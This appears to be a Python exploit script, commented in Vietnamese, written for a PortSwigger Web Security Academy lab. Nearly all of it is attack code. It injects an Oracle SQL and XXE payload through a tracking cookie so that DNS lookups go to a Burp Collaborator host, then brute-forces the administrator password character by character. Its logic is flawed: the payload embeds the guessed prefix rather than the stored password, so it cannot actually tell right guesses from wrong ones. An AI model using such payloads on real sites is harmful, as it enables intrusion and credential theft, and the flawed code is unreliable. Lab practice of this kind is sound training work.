import requests
import urllib.parse
import time

BASE_URL = "https://acXXXXXX.web-security-academy.net"  # Thay bằng URL lab
BURP_COLLABORATOR_DOMAIN = "your-collab-id.burpcollaborator.net"  # Thay bằng domain từ Collaborator
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
MAX_PASSWORD_LENGTH = 20

def create_payload(prefix):
    # Sử dụng XXE để leak dữ liệu qua DNS query
    # password sẽ bị chèn vào hostname như: abcd.<collab-id>
    xxe = (
        f"<!DOCTYPE root [<!ENTITY % remote SYSTEM "
        f"\"http://{prefix}.{BURP_COLLABORATOR_DOMAIN}/\"> %remote;]>"
    )
    payload = f"""x'||(SELECT+EXTRACTVALUE(xmltype('{xxe}'),'/l')+FROM+dual)--"""
    return urllib.parse.quote(payload)

def send_payload(prefix):
    payload = create_payload(prefix)
    cookies = {
        "TrackingId": payload,
        "session": "dummy-session-id"  # giữ cho hợp lệ
    }
    r = requests.get(BASE_URL, cookies=cookies)
    return r.status_code

def brute_force():
    password = ""
    for i in range(MAX_PASSWORD_LENGTH):
        found = False
        for ch in CHARSET:
            test_prefix = password + ch
            print(f"[🔍] Thử: {test_prefix}")
            send_payload(test_prefix)

            print(f"  ⏳ Đợi để server gửi DNS request...")
            time.sleep(7)  # Đợi cho server thực hiện truy vấn SQL async

            print(f"  📡 Kiểm tra trong Burp Collaborator: có request tới {test_prefix}.{BURP_COLLABORATOR_DOMAIN} không?")
            user_input = input("     → Có thấy request? (y/N): ").lower().strip()
            if user_input == "y":
                password += ch
                print(f"✅ Tìm thấy ký tự đúng: {ch}")
                found = True
                break
        if not found:
            print("❌ Không tìm được ký tự tiếp theo. Dừng lại.")
            break
    print(f"\n[🏁] Mật khẩu tìm được: {password}")
    return password

# === Main ===
if __name__ == "__main__":
    print("[🚀] Bắt đầu dò mật khẩu administrator qua OOB SQLi...")
    brute_force()
